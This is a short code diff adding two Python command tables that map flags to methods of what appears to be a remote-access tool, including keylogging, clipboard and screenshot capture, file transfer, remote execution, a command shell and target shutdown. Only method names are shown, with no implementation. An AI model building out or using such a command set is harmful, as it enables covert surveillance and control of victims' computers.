@@ -36,3 +36,49 @@ input()
 """
 
 """
+
+dict = {
+    "-Host": self.sendHostInfo,
+    "-Msg": self.sendMsg,
+    "-Fsend": self.filesend,
+    "-RP": self.runprocess,
+    "-RR": self.runrun,
+    "-Telnet": self.enableTN,
+    "-Chess": self.playchess,
+    "-EpIV": self.playstarwars,
+    "-Weather": self.weather,
+    "-lock": self.locksystem,
+    "-shutdown": self.shutdown,
+    "-shutdownM": self.shutdownmessage,
+    "-restart": self.restart,
+    "-shell": self.fakeshell,
+    "-loop": self.endless,
+    ""
+
+}
+newdict= {
+    "-msgbox": self.sendmsg,
+    "-shutdown": self.shutdown,
+    "-shutdownM" : self.shutdownmessage,
+    "-lock": self.locksystem,
+    "-restart": self.restartsystem,
+    "-EpIV": self.playstarwars,
+    "-chess": self.playchess,
+    "-weather": self.weather,
+    "-telnet": self.enableTN,
+    "-KLstart": self.startKeyLogger,
+    "-KLend": self.stopKeyLogger,
+    "-getLogs": self.getKeyLogs,
+    "-getcb": self.getClipBoard,
+    "-Send": self.filesend,
+    "-recv": self.filerecieve,
+    "-ginfo": self.getTargetInfo,
+    "-exe": self.exePy,
+    "-ss": self.screenshot,
+    "-vid": self.vidByFrames,
+    "-shell": self.cmdctrl
+
+
+
+}
+
